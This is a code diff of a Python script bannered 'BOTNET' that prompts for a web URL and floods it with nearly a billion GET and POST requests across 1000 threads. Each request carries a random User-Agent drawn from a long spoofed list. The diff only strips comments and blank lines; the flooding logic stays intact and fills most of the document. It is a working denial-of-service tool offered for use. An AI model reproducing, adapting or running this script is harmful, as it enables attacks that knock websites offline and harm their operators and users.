@@ -9,11 +9,11 @@ from pystyle import *
 import aiohttp
 import asyncio
 
-# OS platform check
+
 osystem = sys.platform
 os.system("clear" if osystem == "linux" else "cls")
 
-# Banner
+
 ascii_art = """
 ......... .............................................................&........
 .........*................,.... #*,,,,**,,****,*( .....................,,.......
@@ -51,18 +51,18 @@ ascii_art = """
 """
 banner = r""" BOTNET """.replace('▓', '▀')
 banner = Add.Add(ascii_art, banner, center=True)
-#print(Colorate.Horizontal(Colors.green_to_blue, banner))
+
 print(Colorate.Vertical(Colors.yellow_to_red, banner))
-#print(banner)
 
-#print(ascii_art)
+
+
 time.sleep(1)
-#os.system("clear" if osystem == "linux" else "cls")
 
-# Input URL
+
+
 url = input(str("{+} Enter Web URL: "))
 
-# Random User-Agent List
+
 
 user_agents = [
     ################################################################################################################################################################################################################################################################",
@@ -1074,13 +1074,13 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
 
     
-    # Add more as needed
+   
 ]
 def send_request(url):
     headers = {"User-Agent": random.choice(user_agents)}
-    data = {"key": "value"}  # Sample POST data, modify as needed
+    data = {"key": "value"} 
     try:
-        # Randomly choose between GET and POST
+        
         if random.choice(["GET", "POST"]) == "GET":
             response = requests.get(url, headers=headers, stream=True, timeout=5)
             print(f"GET request sent. Status: {response.status_code}")
@@ -1096,16 +1096,16 @@ def send_request(url):
     except requests.RequestException as e:
         print(f"Error occurred: {e}")
 
-# Threading for Concurrent Requests
+
 def start_requests(url, num_requests, num_workers):
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
         futures = [executor.submit(send_request, url) for _ in range(num_requests)]
         for future in concurrent.futures.as_completed(futures):
-            future.result()  # Blocking call to wait for each task to finish
+            future.result()  
 
-# Main function to start sending requests
+
 if __name__ == "__main__":
-    num_requests = 999999999   # Number of requests to send
-    num_workers = 1000      # Number of threads
+    num_requests = 999999999   
+    num_workers = 1000      
     print(f"Sending {num_requests} requests to {url} with {num_workers} workers...")
     start_requests(url, num_requests, num_workers)
